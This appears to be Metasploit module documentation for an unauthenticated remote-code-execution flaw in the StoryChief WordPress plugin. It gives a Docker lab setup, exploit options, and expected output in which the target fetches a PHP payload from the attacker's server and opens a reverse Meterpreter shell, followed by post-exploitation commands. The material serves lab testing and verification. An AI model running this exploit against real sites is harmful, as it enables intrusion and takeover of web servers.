## Vulnerable Application

This module exploits an **unauthenticated Remote Code Execution (RCE)** vulnerability in the **StoryChief WordPress plugin <= 1.0.42**.

The vulnerability exists due to improper validation of webhook HMAC signatures. The plugin accepts a forged signature when the shared secret is empty, allowing unauthenticated attackers to submit crafted webhook requests that cause the server to:

1. Fetch attacker-controlled content
2. Store it inside the WordPress uploads directory
3. Execute arbitrary PHP code

No authentication or user interaction is required.

---


## Container Architecture Overview

The lab consists of two containers:

| Service   | Image           | Purpose                |
| --------- | --------------- | ---------------------- |
| wordpress | wordpress:6.3.2 | Vulnerable application |
| db        | mysql:5.7       | Backend database       |

Both containers are attached to an isolated Docker bridge network automatically created by Docker Compose.

```
Attacker (Metasploit)
        |
        v
  -------------------
  | Docker Bridge   |
  | 172.18.0.0/16   |
  -------------------
        |
   --------------
   | wordpress  |
   | (Apache +  |
   |  PHP)      |
   --------------
        |
   --------------
   |  mysql     |
   --------------
```

The WordPress container communicates with MySQL internally using Docker DNS resolution (`db`).

---

# Docker Compose Configuration

```yaml
version: '3.8'

services:
  wordpress:
    image: wordpress:6.3.2
    container_name: wp_storychief
    restart: always
    ports:
      - "8080:80"
    environment:
      WORDPRESS_DB_HOST: db
      WORDPRESS_DB_USER: root
      WORDPRESS_DB_PASSWORD: rootpass
      WORDPRESS_DB_NAME: wordpress
    volumes:
      - wordpress_data:/var/www/html
      - ./php.ini:/usr/local/etc/php/conf.d/custom.ini
    depends_on:
      - db
      
  db:
    image: mysql:5.7
    container_name: wp_db
    restart: always
    environment:
      MYSQL_DATABASE: wordpress
      MYSQL_ROOT_PASSWORD: rootpass
    volumes:
      - db_data:/var/lib/mysql

volumes:
  wordpress_data:
  db_data:
```

---

## Optional PHP Configuration

Create `php.ini`:

```ini
upload_max_filesize = 64M
post_max_size = 64M
memory_limit = 256M
```

This ensures large payload uploads are not blocked by container PHP limits.

---


## Verification Steps


## 1. Start the Lab

```bash
docker compose up -d
docker ps
```

Ensure:

* WordPress container is running
* MySQL container is running
* Port `8080` is bound successfully

If port 8080 is already in use:

```yaml
ports:
  - "8081:80"
```

Then update Metasploit:

```
set RPORT 8081
```



---

## 2. Complete WordPress Installation

Visit:

```
http://localhost:8080
```

Finish the WordPress setup wizard.

After login, you **must configure permalinks properly** to avoid webhook routing issues.

Go directly to:

```
http://localhost:8080/wp-admin/options-permalink.php
```

Change:

* From: **Plain**
* To: **Post name**

Then click **Save Changes**.



---

## 3️. Install Vulnerable Plugin

* Upload StoryChief version `1.0.42`
* Activate plugin
* Ensure webhook feature is enabled
* Leave webhook secret empty (default vulnerable state)

Confirm version inside container:

```bash
docker exec -it wp_storychief bash
cd /var/www/html/wp-content/plugins
grep Version story-chief/storychief.php
```

Expected:

```
Version: 1.0.42
```

---

## 4️. Determine Correct LHOST (Important for WSL2)

Inside your attacking environment:

```bash
ip a
```

Locate your interface IP (inet 172.x.x.x/20).



---

## 5️. Launch Metasploit

```bash
msfconsole
use exploit/multi/http/wp_plugin_story_chef_file_upload
```

---

## 6️. Configure Exploit Properly

```
set RHOSTS 127.0.0.1
set RPORT 8080
set TARGETURI /
set LHOST <LHOST-ip>
set SRVPORT 8000
```

Important:

* `SRVPORT` must NOT equal `RPORT`
* Default `SRVPORT 8080` conflicts with WordPress container

---

## 7️. Run Exploit

```
run
```

Expected output:

```
[*] Started reverse TCP handler on 172.21.176.212:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. StoryChief webhook endpoint reachable and likely vulnerable
[*] Starting local HTTP server for payload hosting
[*] Using URL: http://172.21.176.212:8000/LwYLvAyJV.php
[*] Payload URL: http://172.21.176.212:8000/LwYLvAyJV.php/LwYLvAyJV.php
[*] Sending malicious webhook request
[+] Serving malicious payload to 172.21.176.1
[+] Webhook accepted payload — attempting execution
[*] Attempting to execute uploaded payload at /wp-content/uploads/2026/02/LwYLvAyJV.php
[*] Sending stage (42137 bytes) to 172.21.176.1
[+] Deleted LwYLvAyJV.php
[*] Meterpreter session 1 opened (172.21.176.212:4444 -> 172.21.176.1:55688) at 2026-02-15 19:08:57 +0200
```

If you see:

```
Upload path did not return HTTP 200
```

but a session opens successfully — this is a harmless race condition and can be ignored.

---

## 8️. Confirm Code Execution

Inside Meterpreter:

```
sysinfo
getuid
shell
whoami
pwd
```

Expected:

```
Computer        : 41dcc6d2d33a
OS              : Linux 41dcc6d2d33a 6.6.87.2-microsoft-standard-WSL2 #1 SMP PREEMPT_DYNAMIC Thu Jun  5 18:30:46 UTC 2025 x86_64
Architecture    : x64
System Language : C
Meterpreter     : php/linux
Server username: www-data

www-data
/var/www/html/wp-content/uploads/2026/02
```

This confirms:

* Payload written to uploads directory
* Code executed as web server user
* Execution occurred inside container namespace

---

## 9️. Validate Container Isolation (Optional)

From Meterpreter shell:

```
cat /proc/1/cgroup
```

You should observe containerized environment behavior.

This confirms exploitation is limited to container context.

